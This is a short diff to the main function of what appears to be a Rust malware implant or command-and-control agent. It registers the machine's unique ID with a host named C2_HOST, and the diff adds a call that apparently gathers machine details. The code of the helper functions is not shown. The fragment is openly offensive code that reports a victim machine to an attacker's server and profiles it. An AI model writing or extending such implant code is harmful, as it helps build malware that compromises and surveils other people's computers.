@@ -5,4 +5,5 @@ mod utils;
 
 fn main() {
     utils::register_client(constants::C2_HOST, machine_uid::get().unwrap().as_str()).unwrap();
+    utils::machine_details();
 }
